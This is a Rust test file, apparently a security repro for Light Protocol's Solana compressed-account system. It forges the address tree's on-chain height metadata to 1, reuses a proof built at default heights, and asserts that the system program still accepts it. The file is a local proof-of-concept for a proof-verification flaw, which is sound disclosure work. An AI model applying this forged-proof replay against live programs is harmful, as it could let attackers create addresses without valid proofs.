#![cfg(feature = "test-sbf")]

use std::collections::HashMap;

use anchor_lang::{
    prelude::borsh::{BorshDeserialize, BorshSerialize},
    Discriminator,
};
use create_address_test_program::create_invoke_cpi_instruction;
use light_batched_merkle_tree::{
    constants::DEFAULT_BATCH_STATE_TREE_HEIGHT,
    initialize_address_tree::InitAddressTreeAccountsInstructionData,
    initialize_state_tree::InitStateTreeAccountsInstructionData,
    merkle_tree_metadata::BatchedMerkleTreeMetadata,
};
use light_client::{indexer::AddressWithTree, rpc::Rpc};
use light_compressed_account::{
    address::{derive_address, pack_new_address_params_assigned},
    compressed_account::{PackedMerkleContext,PackedReadOnlyCompressedAccount},
    instruction_data::{
        compressed_proof::CompressedProof,
        data::pack_pubkey_usize,
        with_account_info::{CompressedAccountInfo, InstructionDataInvokeCpiWithAccountInfo},
    },
    Pubkey as LcPubkey,
};
use light_compressed_token::process_transfer::transfer_sdk::to_account_metas;
use light_program_test::{indexer::TestIndexer, program_test::TestRpc, Indexer, LightProgramTest, ProgramTestConfig};
use light_prover_client::prover::{spawn_prover, ProverConfig};
use light_sdk::address::NewAddressParamsAssigned;
use serial_test::serial;
use solana_sdk::{pubkey::Pubkey, signature::Keypair, signer::Signer};

/// Repro using *invoke_cpi_with_account_info*:
/// 1) Build proof with default heights (state=32, address=40).
/// 2) Forge on-chain address-tree height to 1.
/// 3) Reuse the same proof; expect success because v2 OR gate admits when one height matches default.
#[tokio::test]
#[serial]
async fn tree_height_or_account_info() {
    spawn_prover(ProverConfig::default()).await;

    // Default batched trees (state=32, address=40)
    let mut config = ProgramTestConfig::default_with_batched_trees(false);
    config.with_prover = false;
    config.v2_state_tree_config = Some(InitStateTreeAccountsInstructionData::default());
    config.v2_address_tree_config = Some(InitAddressTreeAccountsInstructionData::test_default());
    config.additional_programs =
        Some(vec![("create_address_test_program", create_address_test_program::ID)]);

    let mut rpc = LightProgramTest::new(config).await.unwrap();
    let env = rpc.test_accounts.clone();
    let payer: Keypair = rpc.get_payer().insecure_clone();

    let addr_tree_pk = env.v2_address_trees[0];
    let state_tree_pk = env.v2_state_trees[0].merkle_tree;

    // Sanity: state height default (32)
    let state_account = rpc.get_account(state_tree_pk).await.unwrap().unwrap();
    let mut state_slice: &[u8] = &state_account.data[8..8 + BatchedMerkleTreeMetadata::LEN];
    let state_meta = BatchedMerkleTreeMetadata::deserialize(&mut state_slice).unwrap();
    assert_eq!(state_meta.height, DEFAULT_BATCH_STATE_TREE_HEIGHT);

    // -------- 1) Build proof at default heights --------
    let test_indexer = TestIndexer::init_from_acounts(&payer, &env, 0).await;

    let seed = [3u8; 32];
    let address = derive_address(&seed, &addr_tree_pk.to_bytes(), &create_address_test_program::ID.to_bytes());
    let addresses_with_tree = vec![AddressWithTree { address, tree: addr_tree_pk }];

    let proof_with_context = test_indexer
        .get_validity_proof(Vec::new(), addresses_with_tree.clone(), None)
        .await
        .unwrap()
        .value;

    let addr_root_idx = proof_with_context.get_address_root_indices()[0];
    let state_root_idx = proof_with_context
    .get_root_indices()
    .first()              // toma el primer Option<u16>, si existe
    .and_then(|x| *x)     // extrae el u16 del Option
    .unwrap_or(0);   
    //let compressed_proof: CompressedProof = proof_with_context.proof.clone();

    // -------- 2) Forge address-tree height to 1 --------
    let mut addr_account = rpc.get_account(addr_tree_pk).await.unwrap().unwrap();
    let mut addr_slice: &[u8] = &addr_account.data[8..8 + BatchedMerkleTreeMetadata::LEN];
    let mut addr_meta = BatchedMerkleTreeMetadata::deserialize(&mut addr_slice).unwrap();
    addr_meta.height = 1;
    let mut serialized = Vec::new();
    BatchedMerkleTreeMetadata::serialize(&addr_meta, &mut serialized).unwrap();
    addr_account.data[8..8 + serialized.len()].copy_from_slice(&serialized);
    rpc.set_account(addr_tree_pk, addr_account);

    // -------- 3) Reuse SAME proof via invoke_cpi_with_account_info --------
    let mut remaining_accounts: HashMap<LcPubkey, usize> = HashMap::new();

    // Params for new address (uses addr tree + the root index from the proof)
    let new_address_params = vec![NewAddressParamsAssigned {
        seed,
        address_queue_pubkey: addr_tree_pk.into(),
        address_merkle_tree_pubkey: addr_tree_pk.into(),
        address_merkle_tree_root_index: addr_root_idx,
        assigned_account_index: None,
    }];
    let packed_new_address_params =
        pack_new_address_params_assigned(&new_address_params, &mut remaining_accounts);

    // Include state tree + queue in remaining metas (even if not using read-only leaves)
    let state_queue_pk = env.v2_state_trees[0].output_queue;
    let _queue_index = pack_pubkey_usize(&state_queue_pk.into(), &mut remaining_accounts);
    let _tree_index = pack_pubkey_usize(&state_tree_pk.into(), &mut remaining_accounts);

    // NEW: read-only state account (just needs to anchor the state tree + root index)
    let state_readonly = PackedReadOnlyCompressedAccount {
        account_hash: [0u8; 32], // not used when prove_by_index=false
        merkle_context: PackedMerkleContext {
            merkle_tree_pubkey_index: _tree_index,
            queue_pubkey_index: _queue_index,
            leaf_index: 0,
            prove_by_index: false,
        },
        root_index: state_root_idx,
    };
   
    // We don't need to provide read-only leaves; use account_info path
    let ix_data = InstructionDataInvokeCpiWithAccountInfo {
        mode: 0,
        bump: 255,
        invoking_program_id: create_address_test_program::ID.into(),
        compress_or_decompress_lamports: 0,
        is_compress: false,
        with_cpi_context: false,
        with_transaction_hash: false,
        cpi_context: Default::default(),
        proof: proof_with_context.proof.into(),
        new_address_params: packed_new_address_params,
        account_infos: vec![],
        read_only_addresses: vec![],
        read_only_accounts: vec![state_readonly],  // <-- add this
    };

    let remaining_accounts = remaining_accounts
        .into_iter()
        .map(|(k, v)| (Pubkey::from(k), v))
        .collect::<HashMap<Pubkey, usize>>();
    let remaining_accounts = to_account_metas(remaining_accounts);

    let instruction = create_invoke_cpi_instruction(
        payer.pubkey(),
        [
            light_system_program::instruction::InvokeCpiWithAccountInfo::DISCRIMINATOR.to_vec(),
            ix_data.try_to_vec().unwrap(),
        ]
        .concat(),
        remaining_accounts,
        None,
    );

    let res = TestRpc::create_and_send_transaction_with_batched_event(
        &mut rpc,
        &[instruction],
        &payer.pubkey(),
        &[&payer],
        None,
    )
    .await;

    assert!(
        res.is_ok(),
        "Expected success via OR-logic: reused proof accepted even though address_tree_height was forged to 1",
    );
}
